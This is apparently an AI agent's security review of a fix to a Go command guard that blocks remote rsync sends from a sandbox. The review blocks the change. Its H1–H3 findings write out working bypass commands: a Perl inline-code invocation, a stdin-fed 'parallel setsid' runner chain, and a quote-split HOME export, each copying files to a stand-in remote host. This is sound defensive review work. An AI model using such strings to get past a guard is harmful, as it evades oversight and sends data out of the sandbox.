[jobs:job-done] job 261106-154035-3b12 BENCH-REVIEW M #155 opus-high succeeded · 21 turns · cost unknown · 6m · model gpt-6.1-sol · effort high

## Not done / uncertain
Go tests and `scripts/check.sh` were not run: compilation and tests require filesystem writes. Guard outcomes above were established by source tracing, not runtime `Check` execution. No transfers or subagents were used.

## Progress
- 17:28 UTC Inspected diff and prioritized guard/external-send risks.
- 17:30 UTC Traced parser, runner contexts, and argument checks.
- --:-- UTC Verified Perl syntax and intercepted Bash expansion.
- 17:33 UTC Completed formatting checks and confirmed clean worktree.

BENCH-VERDICT: critical=0 high=3 medium=1 low=0 issue_fixed=partly

## Summary
Verdict: BLOCK
Risky areas: guard/sandbox enforcement and external sends through remote rsync.
Reviewed `8f6e8f9..a7563c9` read-only. The exact issue examples are covered, but three bypass conditions remain open and one local-command regression was introduced.

## Findings / Changes

### Delivered
- **Closed:** literal `+` inside find argv — `internal/guard/guard.go:1633`.
- **Open:** inline interpreter code — attached Perl options bypass detection at `internal/guard/guard.go:1560`.
- **Open:** dynamic operands — quoted HOME assignments bypass the tilde check at `internal/guard/guard.go:2153`.
- **Closed:** `--log-file-format` value consumption — `internal/guard/guard.go:1474`.
- **Closed:** quoted filter exemption — `internal/guard/guard.go:2660`.
- **Open:** nested stdin-fed runners — inherited input provenance disappears at `internal/guard/guard.go:1603`.

### Design
The change follows the proposed fail-closed approach. However, tracking only the nearest runner and checking HOME changes against raw shell text leave the required conditions incomplete.

### Code
**H1 — High, inline-code condition remains open.** `internal/guard/guard.go:1560`:  
`perl -esystem+q+rsync+,q+./src/+,q+host:/dst/+` escapes detection: its argument lacks the heuristic’s punctuation, and attached `-e` is not recognized as an exec value. The nested extractor also misses `system+`. Perl deparsing verified that this invokes remote rsync. Minimal fix: recognize interpreter code through option parsing, including attached `-e` and `-E`, before checking mentions.

**H2 — High, nested-runner condition remains open; regression.** `internal/guard/guard.go:1568`:  
`printf '%s\n' host:/dst/ | parallel setsid rsync ./src/` passes the remote-copy check. Static tracing shows `execContext` replaces `parallel` with `setsid`; `stdinRunners[runner[k]]` becomes false and only the visible local operand is scanned. Previously, the outer `parallel` check rejected it. Minimal fix: retain an inherited “arguments supplied from stdin” flag through every nested runner.

**H3 — High, dynamic-operand condition remains open.** `internal/guard/guard.go:2153`:  
`export H'O'ME=host:; rsync ./src/ ~/dst/` evades `reHomeSet`. Bash quote removal produces a HOME assignment, but the regex examines the original text. A harmless Bash function intercept verified the resulting operands: `./src/`, `host:/dst/`. Static tracing confirms the tilde check receives `homeSet=false`. Minimal fix: derive HOME mutations from parsed words, using `localVars`, including its unknown-mutation result.

**M1 — Medium, local-command regression.** `internal/guard/guard.go:1607`:  
`setsid find . -maxdepth 0 -exec rsync ./src/ ./dst/ \; -exec echo done \;` is falsely rejected. Static tracing shows nested find receives no action boundaries; rsync scanning continues into the second `-exec`, whose `e` triggers refusal. Previously, scanning stopped at `;`. Minimal fix: recognize find-action boundaries beneath runners.

The added tests cover the supplied examples, but omit these four cases. Add refusal tests for H1–H3 and an allowance test for M1.

### Blocking
internal/guard/guard.go:1560 — H1: close attached interpreter-code bypass.
internal/guard/guard.go:1568 — H2: preserve stdin provenance through runners.
internal/guard/guard.go:2153 — H3: detect parsed HOME mutations.
internal/guard/guard.go:1607 — M1: restore nested find boundaries.

### Non-blocking
none

## Evidence
- Inspected the complete fix diff and relevant parser/check paths.
- `git diff --check` and changed-file `gofmt -l`: clean.
- Perl `-MO=Deparse`: confirmed remote-rsync invocation without executing it.
- Bash function interception: confirmed remote operand after tilde expansion.
- Final `git status --short`: clean.
